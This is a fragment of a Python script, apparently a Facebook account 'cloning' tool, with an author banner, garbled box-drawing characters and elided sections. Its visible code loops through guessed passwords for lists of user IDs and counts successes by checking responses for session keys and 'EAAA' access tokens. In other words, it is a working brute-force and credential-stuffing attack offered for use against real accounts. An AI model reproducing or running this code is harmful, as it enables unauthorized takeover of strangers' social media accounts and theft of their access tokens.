...
\033[1;92m  `--`         `--`       `--`         `--`---' `--`-' `-`--` 
    ...
    鈹屸攢鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹�
     [ AUTHOR   : AKASH            
     [ GITHUB   : AKASHTTC22         
     [ WHATSAPP : 01635795657        
     [ POWER BY : \x1b[1;32mKST AKASH\x1b[1;97m            
    鈹斺攢鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹榎033[1;92m""")
		...
		if hoga in ["", " "]:
			...
			os.system('am start https://www.facebook.com/akash.kushtia.yt')
		else:
			Main()
	...
	def email(self):
		x = 111
		xx = 999
		nam = input("%s [?] TYPE A NAME %s(EX:fahim ", " AKASH): "%(Y,G))
		nam = nam.replace(" ", "")
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s\033[0;93m[AKASH-CLONING : \033[0;97m %s/%s -> \033[0;92m [OK-ID:%s ]- \033[0;93m[CP-ID:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[AKASH-OK-ID] %s|%s\033[0;97m         "%(uid, pw))
